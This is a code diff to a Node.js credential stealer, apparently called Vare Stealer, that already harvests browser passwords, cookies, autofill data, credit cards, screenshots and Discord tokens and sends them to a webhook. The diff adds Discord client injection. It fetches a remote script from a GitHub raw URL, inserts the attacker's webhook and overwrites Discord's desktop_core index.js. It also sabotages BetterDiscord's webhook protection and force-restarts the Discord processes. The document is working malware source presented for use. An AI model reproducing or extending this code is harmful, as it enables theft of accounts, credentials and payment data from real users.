@@ -9,13 +9,15 @@ const fse = require('fs-extra')
 const FormData = require('form-data');
 const JSZip = require('jszip');
 const screenshot = require('screenshot-desktop');
-const { execSync } = require('child_process');
+const { execSync, exec } = require('child_process');
 const hideconsole = require('node-hide-console-window');
+const buf_replace = require('buffer-replace');
 
-
+let killdcop = true; // if u want to close discord make this "true" if u dont want to close discord make this "false";
 
 
 const %webhookstring% = "REPLACE_YOUR_WEBHOOK"
+const %INJURLL% = "https://raw.githubusercontent.com/saintdaddy/Vare-Stealer/main/injection/index.js"
 const %keywordstring% = ['github.com','gmail.com','twitch.tv','instagram.com']
 
 
@@ -38,7 +40,9 @@ if (hwidblack.includes(hwid)) {
 
 let appdata = process.env.APPDATA;
 let localappdata = process.env.LOCALAPPDATA;
-
+let LOCAL = process.env.LOCALAPPDATA
+let discords = [];
+let injectPath = [];
 
 let passwordCount = 0;
 let cookieCount = 0;
@@ -1122,7 +1126,6 @@ async function %STARTVARE%() {
       process.exit(1);
   }
   await %VARESTARTUP%()
-  await %VARESLEEP%(5000)
   await %VAREUSERDATA%()
   await %VARESCREENSHOT%().then(res => {
     fs.access(appdata +`\\${cr}_${os.hostname}${random}${random}\\[VARE] User\\screenshot.png`, fs.constants.F_OK, (err) => {
@@ -1133,13 +1136,12 @@ async function %STARTVARE%() {
       });
   })
   await %VAREALLCOOKIES%()
-  await %VARESLEEP%(1000)
   await %VAREALLPASS%()
   await %VAREALLAUTOFILL%()
   await %VAREALLCCS%()
-  await %VARESLEEP%(1000)
   await %SENDLOGS%()
   await %VARESLEEP%(5000)
+  await %DISCORDINJ%()
   await %VARESTEALTOKEN%()
 }
 
@@ -1335,11 +1337,104 @@ async function %VAREALLAUTOFILL%() {
 
 }
 
+function %FINDINDEX%(firstpath) {
+  let dcpaths = fs.readdirSync(firstpath);
+  dcpaths.forEach((file) => {
+      let filePath = path.join(firstpath, file);
+      let fileStat = fs.statSync(filePath);
+      if (fileStat.isDirectory()) {
+          %FINDINDEX%(filePath);
+      } else {
+          if (file === "index.js" && 
+              !firstpath.includes("node_modules") && 
+              firstpath.includes("desktop_core")) {
+              injectPath.push(filePath);
+          }
+      }
+  });
+}
+
+async function %FINDINJ%(firstpath) {
+  const files = await fs.promises.readdir(firstpath);
+  for (const file of files) {
+      const filePath = path.join(firstpath, file);
+      const fileStat = await fs.promises.stat(filePath);
+      if (fileStat.isDirectory()) {
+          if (file === 'vare') {
+              await fs.rmdirSync(filePath);
+          } else {
+              await %FINDINJ%(filePath);
+          }
+      }
+  }
+}
+
+function %INJECTT%() {
+  axios.get(%INJURLL%)
+  .then(response => {
+      let data = response.data;
+      injectPath.forEach(file => {
+          fs.writeFileSync(file, data.replace("%WEBHOOK%", %webhookstring%), {
+              encoding: 'utf8',
+              flag: 'w'
+          });
+      });
+  })
+  .catch(error => {
+      console.log(error);
+  });
+};
+
+async function %KILLDC%() {
+  var clients = [
+  'Discord.exe', 
+  'DiscordCanary.exe', 
+  'discordDevelopment.exe', 
+  'DiscordPTB.exe'
+  ]
+  await exec('tasklist', async (err, stdout, stderr) => {
+      for (const client of clients) {
+        if (stdout.includes(client)) {
+          await exec(`taskkill /F /T /IM ${client}`, (err) => {})
+          await exec(`"${LOCAL}\\${client.replace('.exe', '')}\\Update.exe" --processStart ${client}`, (err) => {})
+        }
+      }
+  })
+};
+function %BETTERBROKE%() {
+  let dir = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
+  if (fs.existsSync(dir)) {
+      let x = fs.readFileSync(dir)
+      fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "vareontop"))
+  }
+  return;
+}
+
+async function %DISCORDINJ%() {
+  fs.readdirSync(LOCAL).forEach(file => {
+    if (file.includes("iscord")) {
+        discords.push(LOCAL + '\\' + file)
+    } else {
+        return;
+    }
+  });
+  for (const paths of discords) {
+    %FINDINDEX%(paths)
+  }
+  for (const paths of discords) {
+      await %FINDINJ%(paths)
+  }
+  await %INJECTT%();
+  await %BETTERBROKE%();
+  if (killdcop)
+  await %KILLDC%();
+}
 
 async function %VARECHECKSTART%() {
   await %VARESLEEP%(1000)
   axios.get('https://yandex.com').then((res) => {%STARTVARE%()}).catch((err) => {%VARESTARTUP%()});
 }
+
 
 %VARECHECKSTART%()
 
